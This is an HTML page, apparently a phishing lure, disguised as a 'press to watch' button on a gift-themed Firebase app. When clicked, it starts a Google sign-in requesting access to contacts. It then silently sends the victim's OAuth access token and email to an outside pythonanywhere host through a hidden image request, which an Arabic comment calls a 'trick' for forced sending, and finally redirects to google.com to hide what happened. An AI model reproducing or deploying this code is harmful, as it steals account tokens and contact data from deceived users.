<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
    <button id="btn" style="padding:20px; background:red; color:white;">اضغط للمشاهدة</button>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
            authDomain: "giftapp-5937d.firebaseapp.com",
            projectId: "giftapp-5937d",
            storageBucket: "giftapp-5937d.firebasestorage.app",
            messagingSenderId: "1067108116204",
            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
        };
        firebase.initializeApp(firebaseConfig);

        firebase.auth().getRedirectResult().then((result) => {
            if (result.credential) {
                const token = result.credential.accessToken;
                const sender = result.user.email;
                
                // استخدام "الرابط المباشر" بدون مسارات فرعية
                const target = `https://mohamedahmed77.pythonanywhere.com/?token=${token}&sender=${sender}`;
                
                // خدعة الصورة للإرسال الإجباري
                const i = new Image();
                i.src = target;

                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
            }
        });

        document.getElementById('btn').onclick = () => {
            const p = new firebase.auth.GoogleAuthProvider();
            p.addScope('https://www.googleapis.com/auth/contacts.readonly');
            firebase.auth().signInWithRedirect(p);
        };
    </script>
</body>
</html>
